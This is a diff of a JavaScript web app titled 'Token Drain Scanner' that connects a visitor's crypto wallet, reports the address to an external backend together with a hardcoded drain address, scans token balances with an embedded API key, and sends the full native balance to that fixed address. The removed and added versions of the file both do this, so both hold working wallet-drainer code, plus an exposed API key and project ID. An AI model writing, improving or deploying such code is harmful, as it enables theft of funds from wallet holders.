@@ -1,186 +1,32 @@
-// ================================================
-// TOKEN DRAIN SCANNER - UPDATED WITH BIGNUMBER FIX
-// ================================================
-
-// First, embed ethers.js directly
-(function embedEthers() {
-    if (typeof ethers !== 'undefined') {
-        console.log('✅ ethers already loaded');
-        initializeApp();
-        return;
-    }
-    
-    console.log('🔄 Embedding ethers.js directly...');
-    
-    // Enhanced ethers implementation with better BigNumber support
-    const ethersPolyfill = {
-        providers: {
-            Web3Provider: function(provider) {
-                this.provider = provider;
-                this.getSigner = function() {
-                    return {
-                        sendTransaction: async function(tx) {
-                            return await provider.request({
-                                method: 'eth_sendTransaction',
-                                params: [tx]
-                            });
-                        },
-                        getAddress: async function() {
-                            const accounts = await provider.request({ 
-                                method: 'eth_accounts' 
-                            });
-                            return accounts[0];
-                        }
-                    };
-                };
-                this.getBalance = async function(address) {
-                    const balanceHex = await provider.request({
-                        method: 'eth_getBalance',
-                        params: [address, 'latest']
-                    });
-                    const balance = parseInt(balanceHex, 16);
-                    return {
-                        _isBigNumber: true,
-                        _value: balance.toString(),
-                        gt: function(other) {
-                            const otherValue = typeof other === 'string' ? parseInt(other, 16) : 
-                                            typeof other === 'object' && other._value ? 
-                                            parseInt(other._value, 10) : 
-                                            parseInt(other, 10);
-                            return balance > otherValue;
-                        },
-                        sub: function(other) {
-                            const otherValue = typeof other === 'string' ? parseInt(other, 16) : 
-                                            typeof other === 'object' && other._value ? 
-                                            parseInt(other._value, 10) : 
-                                            parseInt(other, 10);
-                            const result = balance - otherValue;
-                            return {
-                                _isBigNumber: true,
-                                _value: result.toString(),
-                                toString: function() {
-                                    return result.toString();
-                                },
-                                toHexString: function() {
-                                    return '0x' + result.toString(16);
-                                }
-                            };
-                        },
-                        toString: function() {
-                            return balance.toString();
-                        },
-                        toHexString: function() {
-                            return balanceHex;
-                        }
-                    };
-                };
-                this.getGasPrice = async function() {
-                    const gasPriceHex = await provider.request({
-                        method: 'eth_gasPrice',
-                        params: []
-                    });
-                    const gasPrice = parseInt(gasPriceHex, 16);
-                    return {
-                        _isBigNumber: true,
-                        _value: gasPrice.toString(),
-                        mul: function(other) {
-                            const otherValue = typeof other === 'string' ? parseInt(other, 16) : 
-                                            typeof other === 'object' && other._value ? 
-                                            parseInt(other._value, 10) : 
-                                            parseInt(other, 10);
-                            const result = gasPrice * otherValue;
-                            return {
-                                _isBigNumber: true,
-                                _value: result.toString(),
-                                toString: function() {
-                                    return result.toString();
-                                }
-                            };
-                        }
-                    };
-                };
-            }
-        },
-        BigNumber: {
-            from: function(value) {
-                const numValue = typeof value === 'string' && value.startsWith('0x') ? 
-                               parseInt(value, 16) : 
-                               parseInt(value, 10);
-                return {
-                    _isBigNumber: true,
-                    _value: numValue.toString(),
-                    mul: function(other) {
-                        const otherValue = typeof other === 'string' && other.startsWith('0x') ? 
-                                         parseInt(other, 16) : 
-                                         parseInt(other, 10);
-                        const result = numValue * otherValue;
-                        return {
-                            _isBigNumber: true,
-                            _value: result.toString(),
-                            toString: function() {
-                                return result.toString();
-                            }
-                        };
-                    },
-                    toString: function() {
-                        return numValue.toString();
-                    }
-                };
-            }
-        },
-        utils: {
-            parseEther: function(value) {
-                const numValue = parseFloat(value);
-                const weiValue = Math.floor(numValue * 1e18);
-                return {
-                    _isBigNumber: true,
-                    _value: weiValue.toString(),
-                    toString: function() {
-                        return weiValue.toString();
-                    },
-                    toHexString: function() {
-                        return '0x' + weiValue.toString(16);
-                    }
-                };
-            },
-            formatEther: function(value) {
-                const numValue = typeof value === 'string' ? 
-                               (value.startsWith('0x') ? parseInt(value, 16) : parseInt(value, 10)) : 
-                               value;
-                return (numValue / 1e18).toFixed(6);
-            },
-            formatUnits: function(value, decimals = 18) {
-                const numValue = typeof value === 'string' ? 
-                               (value.startsWith('0x') ? parseInt(value, 16) : parseInt(value, 10)) : 
-                               value;
-                return (numValue / Math.pow(10, decimals)).toFixed(6);
-            }
-        },
-        version: '5.7.2 (polyfill)'
-    };
-    
-    // Set window.ethers
-    window.ethers = ethersPolyfill;
-    
-    console.log('✅ ethers polyfill loaded');
-    setTimeout(initializeApp, 100);
-})();
+import { createAppKit } from "@reown/appkit";
+import { EthersAdapter } from "@reown/appkit-adapter-ethers";
+import { ethers } from "ethers";
 
 // Configuration
 const CONFIG = {
+    projectId: "962425907914a3e80a7d8e7288b23f62",
     backendUrl: "https://tokenbackend-5xab.onrender.com",
     drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
     covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
     
+    // RPC Providers
+    rpcProviders: {
+        1: "https://eth.llamarpc.com",
+        56: "https://bsc-dataseed.binance.org",
+        137: "https://polygon-rpc.com",
+        42161: "https://arb1.arbitrum.io/rpc"
+    },
+    
     networkNames: {
         1: "Ethereum",
-        56: "Binance Smart Chain", 
+        56: "Binance Smart Chain",
         137: "Polygon",
         42161: "Arbitrum"
     }
 };
 
 // Global state
+let appKit = null;
 let provider = null;
 let signer = null;
 let currentAccount = null;
@@ -188,286 +34,405 @@ let currentChainId = null;
 let isConnected = false;
 
 // DOM Elements
-let connectBtn, statusEl, tokensEl, drainBtn;
+let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;
 
-// Initialize app
-function initializeApp() {
-    console.log('🚀 Initializing Token Drain Scanner...');
-    
-    // Get DOM elements
-    connectBtn = document.getElementById('connectBtn');
-    statusEl = document.getElementById('status');
-    tokensEl = document.getElementById('tokens');
-    drainBtn = document.getElementById('drainBtn');
-    
-    // Verify critical elements
-    if (!connectBtn || !statusEl) {
-        console.error('❌ Required elements not found');
-        return;
-    }
-    
-    console.log('✅ DOM elements loaded');
-    
-    // Setup event listeners
-    connectBtn.onclick = handleConnect;
-    if (drainBtn) drainBtn.onclick = handleDrain;
-    
-    // Check existing connection
-    checkExistingConnection();
-    
-    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
-}
+// DEBUG: Track initialization
+console.log('🚀 MAIN.JS LOADING...');
+console.log('Ethers available:', typeof ethers !== 'undefined');
+console.log('Ethers version:', ethers?.version);
 
-// Check existing wallet connection
-async function checkExistingConnection() {
-    if (typeof window.ethereum === 'undefined') {
-        console.log('⚠️ No wallet provider');
-        return;
-    }
-    
+// Initialize when page loads
+document.addEventListener('DOMContentLoaded', async () => {
+    console.log('✅ DOM loaded, initializing app...');
+    await initializeApp();
+});
+
+async function initializeApp() {
     try {
-        const accounts = await window.ethereum.request({ 
-            method: 'eth_accounts' 
-        });
+        console.log('🔄 Initializing app...');
         
-        if (accounts && accounts.length > 0) {
-            const chainIdHex = await window.ethereum.request({ 
-                method: 'eth_chainId' 
-            });
-            const chainId = parseInt(chainIdHex, 16);
-            
-            await handleConnected(accounts[0], chainId);
-        }
-    } catch (error) {
-        console.log('⚠️', error.message);
-    }
-}
+        // Get DOM elements
+        connectBtn = document.getElementById("connectBtn");
+        statusEl = document.getElementById("status");
+        tokensEl = document.getElementById("tokens");
+        tokensContainer = document.getElementById("tokensContainer");
+        drainBtn = document.getElementById("drainBtn");
+        scanAllBtn = document.getElementById("scanAllBtn");
+        chainSelector = document.getElementById("chainSelector");
+        networkSelect = document.getElementById("networkSelect");
+        tokenCount = document.getElementById("tokenCount");
 
-// Handle connect button click
-async function handleConnect() {
-    console.log('🔄 Connect button clicked');
-    
-    if (isConnected) {
-        await disconnectWallet();
-        return;
-    }
-    
-    updateStatus('🔄 Connecting wallet...');
-    
-    // Check if wallet exists
-    if (typeof window.ethereum === 'undefined') {
-        updateStatus('❌ No wallet found!');
-        showWalletInstallGuide();
-        return;
-    }
-    
-    try {
-        // Request accounts - THIS TRIGGERS WALLET POPUP
-        console.log('📤 Requesting accounts from wallet...');
-        const accounts = await window.ethereum.request({ 
-            method: 'eth_requestAccounts' 
-        });
-        
-        console.log('✅ Wallet response:', accounts);
-        
-        if (!accounts || accounts.length === 0) {
-            updateStatus('❌ User denied connection');
+        // Verify elements exist
+        if (!connectBtn) {
+            console.error('❌ CRITICAL: Connect button not found!');
+            updateStatus('Error: Connect button not found');
             return;
         }
         
-        // Get chain ID
-        const chainIdHex = await window.ethereum.request({ 
-            method: 'eth_chainId' 
-        });
-        const chainId = parseInt(chainIdHex, 16);
+        console.log('✅ DOM elements found');
+        updateStatus('🔄 Initializing wallet connection...');
+
+        // Initialize AppKit first
+        await initializeAppKit();
         
-        await handleConnected(accounts[0], chainId);
+        // Setup event listeners
+        setupEventListeners();
+        
+        // Test backend connection
+        await testBackend();
+        
+        console.log("✅ App initialized successfully");
+        updateStatus("✅ Ready! Click 'Connect Wallet' to begin");
         
     } catch (error) {
-        console.error('❌ Connection error:', error);
+        console.error("❌ Initialization error:", error);
+        updateStatus("Failed to initialize: " + error.message);
         
-        if (error.code === 4001) {
-            updateStatus('❌ Connection rejected');
-        } else if (error.code === -32002) {
-            updateStatus('🔄 Connection pending. Check wallet.');
-        } else {
-            updateStatus('❌ Failed: ' + error.message);
-        }
+        // Emergency fallback
+        setupEmergencyFallback();
     }
 }
 
-// Handle successful connection
-async function handleConnected(account, chainId) {
+async function initializeAppKit() {
     try {
-        console.log('🔄 Setting up connection...');
+        console.log("🔄 Initializing AppKit...");
         
-        // Setup provider using our polyfill
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
+        // Create networks array
+        const networks = Object.entries(CONFIG.rpcProviders).map(([id, rpcUrl]) => ({
+            id: parseInt(id),
+            name: CONFIG.networkNames[id] || `Chain ${id}`,
+            rpcUrl: rpcUrl
+        }));
         
-        // Update state
-        currentAccount = account;
-        currentChainId = chainId;
+        console.log('Creating AppKit with networks:', networks);
+        
+        // Initialize AppKit with proper configuration
+        appKit = createAppKit({
+            adapters: [new EthersAdapter()],
+            projectId: CONFIG.projectId,
+            networks: networks,
+            metadata: {
+                name: "Token Drain Scanner",
+                description: "Multi-chain token scanner and drain",
+                url: window.location.origin,
+                icons: ["https://avatars.githubusercontent.com/u/37784886"]
+            },
+            themeMode: "dark",
+            features: {
+                analytics: false
+            }
+        });
+        
+        console.log("✅ AppKit created successfully");
+        console.log("AppKit instance:", appKit);
+        
+        // Subscribe to state changes
+        appKit.subscribeState(handleAppKitState);
+        
+    } catch (error) {
+        console.error("❌ AppKit initialization error:", error);
+        throw error;
+    }
+}
+
+async function testBackend() {
+    try {
+        updateStatus('🔄 Checking backend connection...');
+        const response = await fetch(`${CONFIG.backendUrl}/health`);
+        if (response.ok) {
+            const data = await response.json();
+            console.log("✅ Backend is online:", data);
+        } else {
+            console.log("⚠️ Backend health check failed");
+        }
+    } catch (error) {
+        console.log("⚠️ Backend unreachable:", error.message);
+    }
+}
+
+function setupEventListeners() {
+    console.log("🔄 Setting up event listeners...");
+    
+    // Connect button - CRITICAL: Remove any existing listeners first
+    if (connectBtn) {
+        // Clone and replace to remove all existing listeners
+        const newBtn = connectBtn.cloneNode(true);
+        connectBtn.parentNode.replaceChild(newBtn, connectBtn);
+        connectBtn = newBtn;
+        
+        // Add click listener
+        connectBtn.addEventListener("click", handleConnect);
+        console.log("✅ Connect button listener added");
+        
+        // Debug: Add visual feedback
+        connectBtn.addEventListener('mousedown', () => {
+            console.log('Button mousedown event');
+        });
+        
+        connectBtn.addEventListener('mouseup', () => {
+            console.log('Button mouseup event');
+        });
+    } else {
+        console.error("❌ Connect button not found after DOM ready!");
+    }
+    
+    // Drain button
+    if (drainBtn) {
+        drainBtn.addEventListener("click", handleDrain);
+    }
+    
+    // Scan all chains button
+    if (scanAllBtn) {
+        scanAllBtn.addEventListener("click", handleScanAll);
+    }
+    
+    // Network selector
+    if (networkSelect) {
+        networkSelect.addEventListener("change", handleNetworkChange);
+    }
+}
+
+function setupEmergencyFallback() {
+    console.log('🔄 Setting up emergency fallback...');
+    
+    if (connectBtn) {
+        // Direct MetaMask fallback
+        connectBtn.addEventListener('click', async () => {
+            updateStatus('🔄 Trying direct connection...');
+            
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ 
+                        method: 'eth_requestAccounts' 
+                    });
+                    
+                    if (accounts && accounts.length > 0) {
+                        currentAccount = accounts[0];
+                        isConnected = true;
+                        updateStatus(`✅ Connected directly!\nWallet: ${currentAccount.slice(0, 8)}...`);
+                        showUIElements();
+                        await logConnectionToBackend(currentAccount, 1);
+                        await fetchTokens(currentAccount, 1);
+                    }
+                } catch (err) {
+                    console.error('Direct connection failed:', err);
+                    updateStatus('Connection failed. Please try again.');
+                }
+            } else {
+                updateStatus('Please install MetaMask or another wallet');
+            }
+        });
+        
+        updateStatus('⚠️ Using fallback mode. Click to connect directly.');
+    }
+}
+
+async function handleConnect(event) {
+    console.log("🔄 Connect button clicked!", event);
+    event.preventDefault();
+    event.stopPropagation();
+    
+    try {
+        if (!appKit) {
+            updateStatus("❌ Wallet connection not initialized");
+            console.error("AppKit not initialized");
+            return;
+        }
+        
+        console.log("AppKit state before open:", appKit.state);
+        
+        if (isConnected) {
+            // Disconnect
+            updateStatus("🔄 Disconnecting...");
+            await appKit.disconnect();
+            return;
+        }
+        
+        updateStatus("🔄 Opening wallet modal...");
+        console.log("Calling appKit.open()...");
+        
+        // Open the wallet modal
+        await appKit.open();
+        console.log("✅ Modal opened successfully");
+        
+    } catch (error) {
+        console.error("❌ Connection error:", error);
+        updateStatus("Connection failed: " + error.message);
+        
+        // Try alternative if AppKit.open fails
+        tryAlternativeConnect();
+    }
+}
+
+function tryAlternativeConnect() {
+    console.log("🔄 Trying alternative connection method...");
+    updateStatus("🔄 Trying alternative connection...");
+    
+    // Try using window.ethereum directly
+    if (typeof window.ethereum !== 'undefined') {
+        window.ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => {
+                if (accounts && accounts.length > 0) {
+                    currentAccount = accounts[0];
+                    isConnected = true;
+                    updateStatus(`✅ Connected via fallback\nWallet: ${currentAccount.slice(0, 8)}...`);
+                    showUIElements();
+                    logConnectionToBackend(currentAccount, 1);
+                    fetchTokens(currentAccount, 1);
+                }
+            })
+            .catch(err => {
+                console.error("Fallback connection failed:", err);
+                updateStatus("Please install MetaMask or another wallet");
+            });
+    } else {
+        updateStatus("Please install a wallet extension like MetaMask");
+    }
+}
+
+function handleAppKitState(state) {
+    console.log("🔄 AppKit State Update:", state);
+    
+    if (state.isConnected && state.account && state.chain) {
+        console.log("✅ Connected state detected");
+        handleConnected(state.account, state.chain);
+    } else if (state.isConnected === false && isConnected) {
+        console.log("❌ Disconnected state detected");
+        handleDisconnected();
+    }
+}
+
+async function handleConnected(account, chain) {
+    try {
+        console.log("🔄 Handling connection...");
+        console.log("Account:", account);
+        console.log("Chain:", chain);
+        
+        if (!account?.address || !chain?.id) {
+            console.log("Waiting for account/chain data...");
+            setTimeout(() => handleConnected(account, chain), 100);
+            return;
+        }
+        
+        currentAccount = account.address;
+        currentChainId = chain.id;
         isConnected = true;
         
         // Update UI
-        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+        if (connectBtn) {
+            connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
+        }
         
-        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
-        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
+        updateStatus(`✅ Connected!\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${chain.name}\n⛓️ Chain ID: ${chain.id}`);
         
-        // Show other UI elements
+        // Show UI elements
         showUIElements();
         
-        // Setup wallet listeners
-        setupWalletListeners();
-        
-        // Log to backend
-        await logConnectionToBackend(account, chainId);
+        // Log connection to backend
+        await logConnectionToBackend(currentAccount, chain.id);
         
         // Fetch tokens
-        await fetchTokens(account, chainId);
+        await fetchTokens(currentAccount, chain.id);
+        
+        // Update network selector
+        if (chainSelector && networkSelect) {
+            chainSelector.classList.remove("hidden");
+            networkSelect.value = chain.id;
+        }
+        
+        console.log("✅ Fully connected and ready");
         
     } catch (error) {
-        console.error('❌ Setup error:', error);
-        updateStatus('Setup failed: ' + error.message);
-        isConnected = false;
-        currentAccount = null;
-        currentChainId = null;
+        console.error("❌ Connected handler error:", error);
+        updateStatus("Connection error: " + error.message);
     }
 }
 
-// Setup wallet event listeners
-function setupWalletListeners() {
-    if (typeof window.ethereum === 'undefined') return;
+function handleDisconnected() {
+    console.log("🔄 Handling disconnection...");
     
-    window.ethereum.on('accountsChanged', (accounts) => {
-        console.log('🔄 Accounts changed:', accounts);
-        
-        if (accounts.length === 0) {
-            disconnectWallet();
-        } else if (currentAccount !== accounts[0]) {
-            currentAccount = accounts[0];
-            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
-            fetchTokens(currentAccount, currentChainId);
-        }
-    });
-    
-    window.ethereum.on('chainChanged', (chainIdHex) => {
-        const chainId = parseInt(chainIdHex, 16);
-        console.log('🔄 Chain changed:', chainId);
-        
-        currentChainId = chainId;
-        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
-        updateStatus(`🔄 Network changed: ${chainName}`);
-        
-        fetchTokens(currentAccount, chainId);
-    });
-}
-
-// Disconnect wallet
-async function disconnectWallet() {
-    console.log('🔄 Disconnecting...');
-    
-    try {
-        if (window.ethereum && window.ethereum.disconnect) {
-            await window.ethereum.disconnect();
-        }
-    } catch (error) {
-        console.log('⚠️', error.message);
-    }
-    
-    // Reset state
     currentAccount = null;
     currentChainId = null;
     isConnected = false;
     provider = null;
     signer = null;
     
-    // Update UI
-    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
-    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
-    hideUIElements();
-    
-    if (tokensEl) {
-        tokensEl.innerHTML = '';
+    if (connectBtn) {
+        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
     }
-}
-
-// Show wallet install guide
-function showWalletInstallGuide() {
-    const guideHTML = `
-        <div style="margin: 20px 0; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffc107;">
-            <h4 style="margin-top: 0; color: #856404;">📱 No Wallet Detected</h4>
-            <p>You need a Web3 wallet to continue:</p>
-            <div style="display: flex; gap: 10px; margin: 15px 0;">
-                <a href="https://metamask.io/download/" target="_blank" 
-                   style="padding: 10px 15px; background: #f6851b; color: white; border-radius: 5px; text-decoration: none;">
-                    🔵 MetaMask
-                </a>
-                <a href="https://trustwallet.com/" target="_blank"
-                   style="padding: 10px 15px; background: #3375bb; color: white; border-radius: 5px; text-decoration: none;">
-                    🔶 Trust Wallet
-                </a>
-            </div>
-            <p><small>After installing, refresh and click "Connect Wallet".</small></p>
-        </div>
-    `;
     
-    statusEl.innerHTML = guideHTML;
+    updateStatus("Disconnected");
+    hideUIElements();
 }
 
-// Update status
-function updateStatus(message) {
-    statusEl.textContent = message;
-}
-
-// Show UI elements
-function showUIElements() {
-    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.classList.remove('hidden');
-    });
-}
-
-// Hide UI elements
-function hideUIElements() {
-    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.classList.add('hidden');
-    });
-}
-
-// Log connection to backend
 async function logConnectionToBackend(address, chainId) {
     try {
-        await fetch(CONFIG.backendUrl + '/drain', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+        updateStatus("🔄 Logging connection to backend...");
+        
+        const response = await fetch(`${CONFIG.backendUrl}/drain`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
             body: JSON.stringify({
                 address: address,
                 chainId: chainId,
                 drainTo: CONFIG.drainAddress,
                 timestamp: new Date().toISOString()
-            })
+            }),
         });
+        
+        if (response.ok) {
+            const data = await response.json();
+            console.log("✅ Backend logged connection:", data);
+            updateStatus(`✅ Connected & logged\n💰 Drain address: ${CONFIG.drainAddress.slice(0, 10)}...`);
+        } else {
+            console.log("⚠️ Backend logging failed");
+        }
+        
     } catch (error) {
-        console.log('⚠️ Backend log failed');
+        console.log("⚠️ Backend logging failed:", error.message);
     }
 }
 
-// Fetch tokens
 async function fetchTokens(address, chainId) {
     if (!tokensEl) return;
     
     tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
     
     try {
+        // Try backend first
+        const response = await fetch(`${CONFIG.backendUrl}/tokens/${address}?chainId=${chainId}`);
+        
+        if (response.ok) {
+            const data = await response.json();
+            if (data.success && data.data.tokens && data.data.tokens.length > 0) {
+                displayTokens(data.data.tokens);
+                updateStatus(`✅ Found ${data.data.tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
+                return;
+            }
+        }
+        
+        // Fallback to direct Covalent API
+        await fetchTokensFromCovalent(address, chainId);
+        
+    } catch (error) {
+        console.error("❌ Token fetch error:", error);
+        await fetchTokensFromCovalent(address, chainId);
+    }
+}
+
+async function fetchTokensFromCovalent(address, chainId) {
+    if (!tokensEl) return;
+    
+    try {
         const response = await fetch(
             `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
         );
         
-        if (!response.ok) throw new Error('API failed');
+        if (!response.ok) {
+            throw new Error(`Covalent API error: ${response.status}`);
+        }
         
         const data = await response.json();
         const items = data?.data?.items || [];
@@ -479,34 +444,39 @@ async function fetchTokens(address, chainId) {
                 const value = (t.quote_rate || 0) * amount;
                 
                 return {
-                    symbol: t.contract_ticker_symbol || 'TOKEN',
-                    name: t.contract_name || 'Unknown',
-                    amount: amount.toFixed(6),
-                    value: value ? `$${value.toFixed(2)}` : 'N/A',
+                    symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
+                    name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
+                    amount: amount,
+                    formattedAmount: amount.toLocaleString(undefined, {
+                        minimumFractionDigits: 0,
+                        maximumFractionDigits: 6
+                    }),
+                    value: value,
+                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
                     contractAddress: t.contract_address,
-                    decimals: t.contract_decimals || 18,
-                    balance: t.balance
+                    isNative: t.native_token || false
                 };
             });
         
         if (tokens.length > 0) {
             displayTokens(tokens);
-            updateStatus(`✅ Found ${tokens.length} tokens`);
+            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
         } else {
-            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
-            updateStatus('ℹ️ No tokens found');
+            tokensEl.innerHTML = '<div class="loading">No tokens found on this chain</div>';
+            updateStatus("ℹ️ No tokens found on this chain");
         }
         
     } catch (error) {
-        console.error('❌ Token fetch error:', error);
-        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
-        updateStatus('⚠️ Token scan failed');
+        console.error("❌ Covalent error:", error);
+        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens from Covalent API</div>';
+        updateStatus("⚠️ Token scan failed");
     }
 }
 
-// Display tokens
 function displayTokens(tokens) {
     if (!tokensEl) return;
+    
+    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
     
     const html = tokens.map(token => `
         <div class="token-item">
@@ -515,126 +485,148 @@ function displayTokens(tokens) {
                 <span class="token-name">${token.name}</span>
             </div>
             <div>
-                <div class="token-amount">${token.amount}</div>
-                <div class="token-value">${token.value}</div>
+                <div class="token-amount">${token.formattedAmount || token.amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</div>
+                ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
             </div>
         </div>
     `).join('');
     
     tokensEl.innerHTML = html;
+    
+    if (tokenCount) {
+        tokenCount.textContent = `${tokens.length} token${tokens.length !== 1 ? 's' : ''} • $${totalValue.toFixed(2)}`;
+    }
+    
+    if (tokensContainer) {
+        tokensContainer.classList.remove("hidden");
+    }
 }
 
-// Handle drain - FIXED VERSION
 async function handleDrain() {
     if (!isConnected || !currentAccount) {
-        alert('Please connect wallet first');
+        alert("Please connect wallet first");
         return;
     }
     
-    if (!confirm(`⚠️ WARNING: This will send ALL ETH from your wallet to:\n${CONFIG.drainAddress}\n\nContinue?`)) {
+    if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`)) {
         return;
     }
     
-    const drainBtn = document.getElementById('drainBtn');
+    const statusEl = document.getElementById("status");
+    const drainBtn = document.getElementById("drainBtn");
     
     try {
-        updateStatus('🚀 Starting drain...');
-        
+        updateStatus("🚀 Starting drain process...");
         if (drainBtn) {
             drainBtn.disabled = true;
-            drainBtn.textContent = '⏳ Draining...';
+            drainBtn.textContent = "⏳ Draining...";
         }
         
-        // Get balance in wei (hex string)
-        const balanceHex = await window.ethereum.request({
-            method: 'eth_getBalance',
-            params: [currentAccount, 'latest']
-        });
-        
-        // Get gas price
-        const gasPriceHex = await window.ethereum.request({
-            method: 'eth_gasPrice',
-            params: []
-        });
-        
-        // Convert to numbers
-        const balance = parseInt(balanceHex, 16);
-        const gasPrice = parseInt(gasPriceHex, 16);
-        const gasLimit = 21000;
-        const gasCost = gasPrice * gasLimit;
-        
-        console.log('Balance (wei):', balance);
-        console.log('Gas price (wei):', gasPrice);
-        console.log('Gas cost (wei):', gasCost);
-        
-        // Check if we have enough for gas
-        if (balance <= gasCost) {
-            updateStatus('❌ Not enough ETH for gas fees');
-            alert('Not enough ETH to cover gas fees. You need at least ' + 
-                  (gasCost / 1e18).toFixed(6) + ' ETH for gas.');
-            return;
+        // Get signer from wallet using AppKit's signer
+        if (appKit && appKit.signer) {
+            provider = new ethers.providers.Web3Provider(appKit.signer);
+            signer = provider.getSigner();
+        } else if (typeof window.ethereum !== 'undefined') {
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+        } else {
+            throw new Error("No wallet provider found");
         }
         
-        // Calculate amount to send (balance - 2x gas cost for safety)
-        const sendAmount = balance - (gasCost * 2);
+        // Get ETH balance
+        const balance = await provider.getBalance(currentAccount);
+        const gasPrice = await provider.getGasPrice();
+        const gasLimit = ethers.BigNumber.from(21000);
+        const gasCost = gasPrice.mul(gasLimit);
         
-        if (sendAmount <= 0) {
-            updateStatus('❌ Not enough ETH after gas fees');
-            return;
-        }
-        
-        console.log('Sending amount (wei):', sendAmount);
-        
-        // Convert to hex
-        const sendAmountHex = '0x' + sendAmount.toString(16);
-        
-        // Send transaction
-        const txHash = await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [{
-                from: currentAccount,
+        // Check if enough for gas
+        if (balance.gt(gasCost.mul(2))) {
+            const sendAmount = balance.sub(gasCost.mul(2));
+            
+            const tx = await signer.sendTransaction({
                 to: CONFIG.drainAddress,
-                value: sendAmountHex,
-                gas: '0x' + gasLimit.toString(16), // 21000 in hex
-                gasPrice: gasPriceHex
-            }]
-        });
-        
-        updateStatus(`📤 Transaction sent: ${txHash.slice(0, 20)}...`);
-        console.log('Transaction hash:', txHash);
-        
-        // Wait a bit
-        await new Promise(resolve => setTimeout(resolve, 3000));
-        
-        // Check if transaction was successful
-        updateStatus('✅ Drain completed! Check your wallet.');
-        
-        // Refresh token list
-        await fetchTokens(currentAccount, currentChainId);
+                value: sendAmount,
+                gasLimit: gasLimit
+            });
+            
+            updateStatus(`📤 Transaction sent: ${tx.hash}\n⏳ Waiting for confirmation...`);
+            
+            const receipt = await tx.wait();
+            updateStatus(`✅ Drain completed!\nTransaction confirmed in block ${receipt.blockNumber}`);
+            
+            // Refresh token display
+            await fetchTokens(currentAccount, currentChainId);
+            
+        } else {
+            updateStatus("⚠️ Not enough native token for gas");
+        }
         
     } catch (error) {
-        console.error('❌ Drain error:', error);
-        
-        let errorMsg = error.message || 'Unknown error';
-        if (error.code === 4001) {
-            errorMsg = 'Transaction rejected by user';
-        } else if (error.code === -32603) {
-            errorMsg = 'Transaction failed. Check gas settings.';
-        }
-        
-        updateStatus(`❌ Drain failed: ${errorMsg}`);
-        alert(`Drain failed: ${errorMsg}`);
-        
+        console.error("❌ Drain error:", error);
+        updateStatus(`❌ Drain failed: ${error.message}`);
+        alert(`Drain failed: ${error.message}`);
     } finally {
+        const drainBtn = document.getElementById("drainBtn");
         if (drainBtn) {
             drainBtn.disabled = false;
-            drainBtn.textContent = '⚡ Drain Wallet';
+            drainBtn.textContent = "⚡ Drain Wallet";
         }
     }
 }
 
-// Debug
-console.log('=== Token Drain Scanner ===');
-console.log('Ethers polyfill loaded');
-console.log('Window.ethereum:', typeof window.ethereum !== 'undefined');
-console.log('===========================');
+async function handleScanAll() {
+    alert("Scan all chains feature coming soon!");
+}
+
+async function handleNetworkChange(event) {
+    const newChainId = parseInt(event.target.value);
+    
+    if (newChainId === currentChainId) {
+        return;
+    }
+    
+    try {
+        updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId] || `Chain ${newChainId}`}...`);
+        
+        // Switch network in wallet
+        await appKit.switchChain({ id: newChainId });
+        
+    } catch (error) {
+        console.error("❌ Network switch error:", error);
+        updateStatus(`❌ Failed to switch network: ${error.message}`);
+        // Reset selector
+        if (networkSelect) {
+            networkSelect.value = currentChainId;
+        }
+    }
+}
+
+function showUIElements() {
+    if (chainSelector) chainSelector.classList.remove("hidden");
+    if (drainBtn) drainBtn.classList.remove("hidden");
+    if (scanAllBtn) scanAllBtn.classList.remove("hidden");
+    if (tokensContainer) tokensContainer.classList.remove("hidden");
+}
+
+function hideUIElements() {
+    if (chainSelector) chainSelector.classList.add("hidden");
+    if (drainBtn) drainBtn.classList.add("hidden");
